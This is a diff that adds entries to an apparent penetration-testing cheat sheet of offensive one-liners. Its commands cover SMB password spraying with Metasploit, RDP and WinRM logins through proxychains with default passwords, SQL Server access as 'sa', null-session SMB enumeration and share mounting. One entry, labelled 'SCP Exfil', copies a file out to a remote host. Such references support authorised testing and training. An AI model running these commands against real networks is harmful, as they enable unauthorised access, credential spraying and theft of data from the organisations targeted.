@@ -21,3 +21,35 @@ Grab user list
 Metasploit Password Spray SMB
 ---------------------------------------------------------------
 `use auxiliary/scanner/smb/smb_login` 
+
+RDP (simple) 
+---------------------------------------------------------------
+`proxychains-ng xfreerdp /v:x.x.x.x /u:username /d:domain.corp /p:Welcome1`
+
+RDP (Clipboard, mounted tsclient) 
+---------------------------------------------------------------
+`proxychains-ng xfreerdp +clipboard /v:x.x.x.x /u:username /d:domain.local /drive:tsclient,/path/to/mounted/folder/` 
+
+Evil-winrm
+---------------------------------------------------------------
+`proxychains-ng evil-winrm -i x.x.x.x -u username -p 'Welcome1'`
+
+SCP Exfil
+---------------------------------------------------------------
+`scp SuperSecretDummyExfil.xlsx username@x.x.x.x:/home/pentesting`
+
+Database CommandLine Access SQSH
+---------------------------------------------------------------
+`proxychains-ng sqsh -S x.x.x.x -U sa -P Welcome1`
+
+Access SMB Share
+---------------------------------------------------------------
+Check for null session  
+`echo exit | smbclient -L \\\\$line`
+
+Connect and explore through smbclient  
+`smbclient //x.x.x.x/share`  
+
+Mount open share locally  
+`sudo mount //x.x.x.x/share /mnt/share`
+
